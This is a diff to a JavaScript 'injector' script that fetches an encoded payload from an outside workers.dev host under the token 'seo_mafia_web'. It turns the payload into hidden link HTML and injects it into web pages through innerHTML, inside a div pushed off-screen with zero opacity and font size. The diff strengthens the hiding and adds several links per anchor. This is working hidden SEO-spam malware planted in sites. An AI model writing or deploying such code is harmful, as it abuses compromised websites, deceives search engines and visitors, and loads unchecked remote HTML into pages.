@@ -4,7 +4,6 @@ try{
 
   const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
   const TOKEN = "seo_mafia_web";
-
   const decode = (s) => {
     try {
       return new TextDecoder().decode(
@@ -16,6 +15,12 @@ try{
     }
   };
 
+  function decodeHTML(str){
+    const txt = document.createElement("textarea");
+    txt.innerHTML = str;
+    return txt.value;
+  }
+
   async function getData(id){
     try{
       const res = await fetch(
@@ -24,11 +29,8 @@ try{
       );
 
       if(!res.ok) throw new Error("Fetch failed: " + res.status);
-
       const json = await res.json();
-
       if(!json || !json.payload) throw new Error("Invalid payload");
-
       return decode(json.payload);
 
     }catch(err){
@@ -46,44 +48,42 @@ try{
       console.warn("Data kosong, inject dibatalkan");
       return;
     }
-
     const anchors = anchorsRaw
+      .replace(/"/g,"")
       .split("\n")
       .map(x => x.trim())
       .filter(Boolean)
       .map(line => {
-        const parts = line.split("|");
+        const parts = line.split("|").map(x=>x.trim()).filter(Boolean);
         if(parts.length < 2) return "";
-        return `<a href="${parts[1].trim()}">${parts[0].trim()}</a>`;
+        const text = parts[0];
+        return parts.slice(1).map(url=>{
+          return `<a href="${url}" target="_blank">${text}</a>`;
+        }).join(" ");
       })
       .filter(Boolean);
 
     let i = 0;
-    const html = articleRaw.replace(/\{ANCHOR\}/g, () => {
-      return anchors.length ? anchors[i++ % anchors.length] : "";
-    });
+    let html;
 
-    function inject(){
-      if(document.getElementById("bunker-payload-2")) return;
-
-      const box = document.createElement("div");
-      box.id = "bunker-payload-2";
-      box.style.position = "absolute";
-      box.style.left = "-9999px";
-      box.innerHTML = html;
-
-      document.body.appendChild(box);
-      console.log("Inject sukses");
-    }
-
-    if(document.readyState !== "loading"){
-      inject();
+    if(/\{ANCHOR/i.test(articleRaw)){
+      html = articleRaw.replace(/\{ANCHOR\s*\}/gi, () => {
+        return anchors[i++ % anchors.length];
+      });
     }else{
-      document.addEventListener("DOMContentLoaded", inject);
+      html = anchors.join(" ");
     }
+    html = decodeHTML(html);
+
+    if(document.getElementById("bunker-payload-2")) return;
+    const box = document.createElement("div");
+    box.id = "bunker-payload-2";
+    box.style.cssText = "position:absolute;left:-9999px;opacity:0;font-size:0;";
+    box.innerHTML = html;
+    document.body.appendChild(box);
+    console.log("✅sukses");
 
   });
-
 }catch(e){
   console.error("Injector fatal error:", e);
 }
